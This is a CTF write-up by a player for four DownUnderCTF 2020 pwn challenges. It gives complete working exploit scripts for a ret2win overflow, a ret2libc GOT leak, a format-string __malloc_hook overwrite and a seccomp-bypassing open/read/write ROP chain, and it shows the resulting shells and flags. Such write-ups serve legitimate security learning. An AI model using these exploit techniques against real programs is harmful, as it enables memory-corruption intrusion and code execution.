---
layout:     post
title:      "DownUnderCTF - Pwn challenges"
subtitle:   "Write-Up"
date:       2020-09-20 
author:     "D4mianwayne"
tag:      pwn, roppy, seccomp. ret2libc
category: CTF writeup
---


I played this CTF mainly because I was chilling out and wanted to try out some challenges from the CTF and since `Faith` was the author of some challenges I wanted to try those out. I managed to do the following challenges:-


# Shell This

We were given the source code and the binary attached, this was simple ret2win attack, since the only protection the binary had was `NX Enabled` which means that no shellcode stuff, although we had a function named `get_shell` which does `execve("/bin/sh", 0, 0)`.

### Finding offset

Usually I had to go with gef's `pattern create` or pwntools's `cyclic` but using radare2:-

```r
[0x004005a0]> pdf @sym.vuln
            ; CALL XREF from main @ 0x400729
┌ 45: sym.vuln ();
│           ; var char *s @ rbp-0x30
│           0x004006e7      55             push rbp                    ; shellthis.c:14
│           0x004006e8      4889e5         mov rbp, rsp
│           0x004006eb      4883ec30       sub rsp, 0x30

-- snip --
```

Since the local variable which is taking our input is of size `rbp - 0x30`, we can then add 8 bytes more to it to get the offset to RIP.

> When the number of local variables would be more than 1, use `pattern create` from gef.

Here's the exploit:-

```py
from roppy import *

p = remote("chal.duc.tf", 30002)
elf = ELF("shellthis")

payload = b"A"*56
payload += p64(elf.function("get_shell"))

p.sendlineafter(": ", payload)
p.interactive()
```

Running the exploit:-


```r
1 [01:01:26] vagrant@oracle(oracle) DUCTF> python3 shellthis.py 
[+] Opening connection to chal.duc.tf on port 30002: Done
[*] Analyzing /home/vagrant/CTFs/DUCTF/shellthis
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
$ 
[*] Interrupted
[*] Closed connection to chal.duc.tf port 30002
```

# return-to-what

This was also a simple ret2libc attack with the remote system being Ubuntu 18.04 which means there's a stack aligment issue, finding the offset was easy. since binary had `NO PIE` we can leak the GOT address of the `puts` then calculate the LIBC's base address and then write a ROP chain which do `system("/bin/sh")`.


```py
from roppy import *
p = remote("chal.duc.tf", 30003)

context.arch = "amd64"
elf = ELF("return-to-what")
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")


pop_rdi = 0x000000000040122b


payload = b"A"*56

# Leak puts by doing `puts(puts@got)`

payload += p64(pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts")) 

# Calling vuln again

payload += p64(elf.function("vuln")) 

p.sendlineafter("?\n", payload)

# Recieving the leaked address and parsing it

leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("LEAK:   0x%x" %(leak))

libc.address = leak - libc.function("puts")

payload = b"A"*56

# Calling the `system("/bin/sh")`
payload += p64(0x0000000000401016) # ret;
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh\x00"))
payload += p64(libc.function('system'))


p.sendlineafter("?\n", payload)
p.interactive()
```

Running the exploit:-
```r
0 [01:04:58] vagrant@oracle(oracle) DUCTF> python3 return-to-what.py 
[+] Opening connection to chal.duc.tf on port 30003: Done
[*] Analyzing /home/vagrant/CTFs/DUCTF/return-to-what
[*] Analyzing /home/vagrant/CTFs/DUCTF/libc6_2.27-3ubuntu1_amd64.so
[*] LEAK:   0x7fc2c21d19c0
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{ret_pUts_ret_main_ret_where???}
$ 
[*] Interrupted
[*] Closed connection to chal.duc.tf port 30003
```

> Alternatively, for the next ROP chain you can do `payload = b"A"*56 + one_gadget` where `one_gadget` could be `one_gadget = libc.address + 0x4f2c5`

# My First Echo Server

As the name implies, it is something related to format string, since it has all the protections enabled and we can invoke the format string vulnerability 3 times, we have to be careful, I divided all 3 into different step:-

```r
|           0x00000834      c745ac000000.  mov dword [var_54h], 0
|       ,=< 0x0000083b      eb2d           jmp 0x86a
|       |   ; CODE XREF from main @ 0x86e
|      .--> 0x0000083d      488b15dc0720.  mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
|      :|                                                              ; [0x201020:8]=0 ; FILE *stream
|      :|   0x00000844      488d45b0       lea rax, qword [format]
|      :|   0x00000848      be40000000     mov esi, 0x40               ; segment.PHDR ; int size
|      :|   0x0000084d      4889c7         mov rdi, rax                ; char *s
|      :|   0x00000850      e84bfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|      :|   0x00000855      488d45b0       lea rax, qword [format]
|      :|   0x00000859      4889c7         mov rdi, rax                ; const char *format
|      :|   0x0000085c      b800000000     mov eax, 0
|      :|   0x00000861      e82afeffff     call sym.imp.printf         ; int printf(const char *format)
|      :|   0x00000866      8345ac01       add dword [var_54h], 1
|      :|   ; CODE XREF from main @ 0x83b
|      :`-> 0x0000086a      837dac02       cmp dword [var_54h], 2
|      `==< 0x0000086e      7ecd           jle 0x83d

```


Since the `var_54h` is the loop counter you can it is being compared to the value `2` and being incremented eveytime after the `printf` is being called, so we have to craft the payload carefully.


* 1: 1st counter we will leak the `libc_start_main + 231` off the stack.
* 2: With LIBC address in hand. we overwrite the `__malloc_hook` in LIBC since it resides in `r/w` region of the LIBC we can overwrite.
* 3: Call `__malloc_hook` by giving `%66000c` this happens because `printf` calls `malloc` when there's a large number of charcaters to print, it has to allocate memory, eventually calling `__malloc_hook`.

Here's the exploit:-

```py
from roppy import *


elf = ELF("echos")
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
p = remote('chal.duc.tf', 30001)


def send(payload):
	p.sendline(payload)


send("%18$p-%19$p")
leaks = p.recvline().split(b"-")
leak = int(leaks[0], 16)
log.info("LEAK:   0x%x" %(leak))

elf.address = leak - 0x890
log.info("ELF:    0x%x" %(elf.address))
leak = int(leaks[1], 16)
log.info("LEAK:  0x%x" %(leak))

libc.address = leak - libc.function("__libc_start_main") - 231
log.info("LIBC:  0x%x" %(libc.address))
one_gadget = libc.address + 0x4f322
malloc_hook = libc.symbol("__malloc_hook")

payload = fmtstr64(8, {malloc_hook: one_gadget})
send(payload)
send("%66000c")
p.interactive()
```
Running the exploit:-
```r
0 [01:27:53] vagrant@oracle(oracle) DUCTF> python3 echos.py 
[*] Analyzing /home/vagrant/CTFs/DUCTF/echos
[*] Analyzing /home/vagrant/CTFs/DUCTF/libc6_2.27-3ubuntu1_amd64.so
[+] Opening connection to chal.duc.tf on port 30001: Done
[*] LEAK:   0x55c50eb9a890
[*] ELF:    0x55c50eb9a000
[*] LEAK:  0x7f17a35d8b97
[*] LIBC:  0x7f17a35b7000
[!] Can't avoid null byte at address 0x7f17a39a2c30
[!] Can't avoid null byte at address 0x7f17a39a2c32
[!] Payload contains NULL bytes.
[*] Switching to interactive mode

-- snip --

$ cat flag.txt
DUCTF{D@N6340U$_AF_F0RMAT_STTR1NG$}
$ 
[*] Interrupted
[*] Closed connection to chal.duc.tf port 30001
```

# Return-to-what revenge

This was also a ret2libc attack but the catch was the seccomp rules, the only allowed syscalls were `read`, `write`. `open` and since the location of the flag was specified, we only had one way, craft a syscall ropchain to read the flag via the allowed syscalls.

```r
d4mian@oracle:~/CTFs/DCTF$ seccomp-tools dump ./return-to-what-revenge 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
```

Okay, so it is not something very trivial, at this point I really wanted roppy to have some ROP chain module but that is on it's way, so let's the chain ourselves:-

First, we need to leak the LIBC attack, we can do that ourselves just like we did in `return-to-what`:-

```py
from roppy import *

p = remote("chal.duc.tf", 30006)

elf = ELF("return-to-what-revenge")
libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
pop_rdi = 0x00000000004019db
flag_location = elf.section(".bss") + 0x400
flag = elf.section(".bss") + 0x200
```

Now, we need to leak the LIBC:-
```py
payload = b"A"*56
payload += p64(pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts"))
```

Now the above chain will leak LIBC, we also need to store the flag location to BSS so the address could be used for `open` later, we do `gets(bss)` with following rop chain:-

```py
payload += p64(pop_rdi)
payload += p64(flag_location)
payload += p64(elf.plt('gets'))
```

We call the `vuln` again so we can send ROP chain later:-

```py
payload += p64(elf.function("vuln"))
p.sendlineafter("?\n", payload)

# Parse the leaked address
leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("LEAK:   0x%x" %(leak))
libc.address = leak - libc.function("puts")
```

We need following gadgets to specify the syscall number and pass arguments to functions called:-

```py
pop_rdx = libc.address + 0x0000000000001b96
pop_rsi = libc.address + 0x0000000000023e6a
syscall = libc.address + 0x00000000000d2975
pop_rax = libc.address + 0x00000000000439c8 

log.info("LIBC:   0x%x" %(libc.address))
```

Now, since we get the address of the LIBC, that means we need to give the `/chal/flag.txt` as a location:-
```py
p.sendline("/chal/flag.txt")
```
Now, time to for real deal:-
```py
payload = b"A"*56
payload += p64(0x401016) # ret; since it is Ubuntu 18.04
```

Now, we do `open` syscall with path being the flag location and mode being the `read-only`:-

```py

'''
open("/chal/flag.txt", 0);
'''
payload += p64(pop_rax)
payload += p64(0x2)
payload += p64(pop_rdi)
payload += p64(flag_location)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(syscall)
```
Then. we do read syscall, since no file is being opened within the binary the `fd` would be 3.(educated guess)
```py
'''
read(0x3, flag, 0x100);
'''
payload += p64(pop_rdi)
payload += p64(0x3)
payload += p64(pop_rsi)
payload += p64(flag)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(0x0)
payload += p64(syscall)
```
Then we do write syscall, writing the flag to the stdout:-

```py
'''
write(1, flag, 0x100);
'''
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(flag)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(0x1)
payload += p64(syscall)

p.sendlineafter("?\n", payload)
p.interactive()
```

Running the exploit:-

```r
0 [01:41:15] vagrant@oracle(oracle) DUCTF> python3 return-to-what-revenge.py 
[+] Opening connection to chal.duc.tf on port 30006: Done
[*] Analyzing /home/vagrant/CTFs/DUCTF/return-to-what-revenge
[*] Analyzing /home/vagrant/CTFs/DUCTF/libc6_2.27-3ubuntu1_amd64.so
[*] LEAK:   0x7f9825f2c9c0
[*] LIBC:   0x7f9825eac000
[*] Switching to interactive mode
DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to chal.duc.tf port 30006
0 [01:41:24] vagrant@oracle(oracle) DUCTF> 
```